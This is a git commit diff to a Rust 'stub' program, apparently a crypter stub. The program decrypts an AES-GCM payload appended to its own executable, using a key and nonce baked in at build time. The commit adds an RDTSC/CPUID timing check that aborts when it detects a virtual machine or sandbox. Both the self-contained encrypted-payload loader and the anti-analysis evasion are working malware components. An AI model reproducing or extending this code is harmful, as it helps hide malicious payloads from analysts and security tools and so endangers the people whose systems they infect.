7abc7cd331cd286c4db48fab0582014a72e2d439
Afloofe <Afunnyfloof@proton.me>
2025-06-28 17:40:06 -0500

    Added better error propogation

--- stub/src/main.rs
+++ stub/src/main.rs
@@ -7,32 +7,45 @@ use std::fs::File;
 use std::env;
 use std::io::SeekFrom;
 use base64::{engine::general_purpose, Engine as _};
-fn main() -> io::Result<()> {
+use core::arch::x86_64::{__cpuid, _rdtsc};
+use std::process;
+use std::error::Error;
 
+fn main() -> Result<(), Box<dyn Error>> {
+    if rdt() {
+        let _ = File::open("asdfasfefh543t9384ghrwe98f3e4h7gt548983rejfhgt7854rf04j853");
+        panic!("womp");
+        process::exit(1);
+    } 
+
+//Get the vars to decrypt data
+
+    //Key base64 and decode
     let key: &'static str =env!("KEY");
-    println!("{}", key.as_bytes().len());
-    let key_dec = general_purpose::STANDARD.decode(&key).expect("dec fail");
-
+    let key_dec = general_purpose::STANDARD.decode(&key)?;
+    //Nonce base64 decode
     let nonce: &'static str= env!("NONCE");
-    let nonce_dec = general_purpose::STANDARD.decode(&nonce).expect("dec 2fail");
+    let nonce_dec = general_purpose::STANDARD.decode(&nonce)?;
  
-    let size: &'static str = env!("SIZE"); 
-    
+    let size: &'static str = env!("SIZE");  
+
+
+    //Convert to genarr
     let key_form = GenericArray::from_slice(&key_dec);
-
     let nonce_form = GenericArray::from_slice(&nonce_dec);
-
-    let size_form: i64= size.parse().expect("parseerror"); 
+    let size_form: i64= size.parse()?;
+    
+    //Open and read self
     let mut buffer = Vec::new();
-    let mut file = File::open(env::current_exe().expect(""))?;
-
+    let mut file = File::open(env::current_exe()?)?;
     let _ = file.seek(SeekFrom::End(-1*size_form));
     let _ = file.read_to_end(&mut buffer)?; 
-
-    //Decrypt 
+    
+    //Decrypt
     let cipher = Aes256Gcm::new(&key_form);  
     let _ = cipher.decrypt_in_place(&nonce_form, b"", &mut buffer);
-
+    
+    //Output (will change later)
     let mut output = File::create("decrypted.txt")?;
     let _ = output.write_all(&buffer);
 
@@ -40,4 +53,25 @@ fn main() -> io::Result<()> {
 
 }
 
+//rdtsc timing check 
+fn rdt() -> bool {
+
+    /*
+        Main check, basicaly mesure time it takes to call cpuid and then see if there is a large
+        variance in it
+    */  
+
+    let iter: u64 = 1000;
+    let sum: u64 = (0..iter)
+        .map(|_| unsafe {
+            let start = _rdtsc();
+            let _ = __cpuid(0);
+            let end = _rdtsc();
+            end - start
+        })
+        .sum();
+
+    let avg = sum / iter;
+    avg > 500
+}
 
